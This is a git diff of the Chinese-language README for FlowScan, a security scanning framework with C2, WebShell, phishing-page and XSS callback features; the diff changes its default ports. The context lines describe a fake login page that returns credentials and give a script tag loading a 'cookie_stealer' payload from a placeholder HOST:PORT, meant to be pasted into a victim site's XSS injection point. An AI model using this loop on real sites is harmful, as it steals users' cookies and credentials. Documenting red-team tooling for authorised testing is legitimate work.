@@ -1,14 +1,6 @@
 # FlowScan
 
 基于 Redis 事件总线的安全扫描编排框架。工具以 YAML 模块描述，事件经 Redis 流转，自动串联成「资产发现 → 端口扫描 → 服务指纹 → 漏洞探测」完整扫描链。内置 Web 控制面板（仪表盘 / 事件中心 / 资产情报 / AI 分析 / 命令 & 控制）、LLM 自动分析与 Agent 交互、xray 被动代理、C2 与 WebShell 管理、XSS 反连与钓鱼页面工作台。
-## 界面展示
-<img width="2360" height="1247" alt="屏幕截图 2026-08-17 015302" src="https://github.com/user-attachments/assets/81dedffe-4011-4dc7-a950-092f8aab7f72" />
-<img width="2527" height="1363" alt="屏幕截图 2026-08-17 015330" src="https://github.com/user-attachments/assets/0afa749f-0aa1-4eae-a05f-44688e4a73b3" />
-<img width="2514" height="1372" alt="屏幕截图 2026-08-17 015426" src="https://github.com/user-attachments/assets/7c38f926-7ad2-4f3b-935e-33987202645a" />
-<img width="2553" height="1391" alt="屏幕截图 2026-08-17 015603" src="https://github.com/user-attachments/assets/dea90b9c-7844-40d5-a04e-3fd07ff46055" />
-<img width="2527" height="1365" alt="屏幕截图 2026-08-17 015501" src="https://github.com/user-attachments/assets/b3359a3e-a486-4271-9c2f-95719f18329c" />
-<img width="2528" height="1361" alt="屏幕截图 2026-08-17 015449" src="https://github.com/user-attachments/assets/2b5a1d8a-be24-4975-83a2-21ae950edb2c" />
-<img width="2530" height="1354" alt="屏幕截图 2026-08-17 015439" src="https://github.com/user-attachments/assets/c1f9fd08-911d-40c9-825b-d7e060f61c60" />
 
 ## 核心特性
 
@@ -61,8 +53,8 @@ cd FlowScan
 bash docker/up.sh --build        # 首次构建镜像；已有镜像可直接 bash docker/up.sh
 ```
 
-- Web 控制面板：http://127.0.0.1:65000（登录账号密码见 `config.yaml` 的 `web_config`）
-- **端口排布（65000-65535 段整体映射）**：web=65000 / redis=65001 / xray=65002 / c2 implant=65003 / c2 client=65004 / xss+钓鱼页面=65005
+- Web 控制面板：http://127.0.0.1:65500（登录账号密码见 `config.yaml` 的 `web_config`）
+- **端口排布（65500-65535 段整体映射）**：web=65500 / redis=65501 / xray=65502 / c2 implant=65503 / c2 client=65504 / xss+钓鱼页面=65505
 - **端口完全配置驱动**：改 `config.yaml` 的 `web_config.port` / `redis.redis_port` / `xray_listen_http_proxy`、`c2` 段的 `server_port` / `client_port`、`phishing` 段的 `port` 后重跑 `bash docker/up.sh`，段内端口自动生效
 - 每次 `bash docker/up.sh` 会**随机化** `config.yaml` 中的 redis 密码 / web 登录密码 / secret_key（容器重启不变；`--no-randomize` 跳过），密码以 `config.yaml` 为准（宿主与容器同一挂载文件）；同机 worker 的密码由 up.sh 自动同步
 - 日志：`docker logs -f flowscan-main`
@@ -240,7 +232,7 @@ XSS 反连 + 钓鱼页面一体工作台，源码在 `phishing_server/`（与 `c
 
 **静态页面模块**（`phishing_server/pages/`）：每页面一个文件夹（index.html + style.css + app.js + meta.json），`{{host}}` / `{{port}}` 占位符自动替换。面板可"设为当前页面"，访问 `http://host:port/` 即展示当前页面，`/page/<名称>` 访问指定页面，页面内资源走 `/pages/<名称>/<文件>`（防路径穿越）。内置 login（仿登录页，提交回传）/ verify / error 等。
 
-**JS 分发服务器**：端口由 config.yaml `phishing.port` 配置（默认 65005），`/payload.js?m=模块&a=JSON参数` 实时构建返回 JS（浏览器下载即执行），`/report` 接收回传（Image beacon 跨域，落 Redis `fs3:phishing:report:*`）。
+**JS 分发服务器**：端口由 config.yaml `phishing.port` 配置（默认 65505），`/payload.js?m=模块&a=JSON参数` 实时构建返回 JS（浏览器下载即执行），`/report` 接收回传（Image beacon 跨域，落 Redis `fs3:phishing:report:*`）。
 
 **XSS 注入闭环**：构建 `xss_payload` 模块 → 得到 `<script src="http://HOST:PORT/payload.js?m=cookie_stealer"></script>` → 粘贴进目标站 XSS 注入点 → 受害者浏览器加载脚本并执行 → 回传数据在面板"受害记录"可见。页面内也可直接内嵌 `<script src="/payload.js?m=hello">` 把钓鱼页与反连 JS 结合。
 
@@ -251,7 +243,7 @@ phishing:
   enabled: true
   project_root: phishing_server
   config_file: config.json
-  port: 65005
+  port: 65505
 ```
 
 > ⚠️ 仅用于授权测试。JS / 页面无沙箱，模块代码即受害者浏览器执行的任意代码。
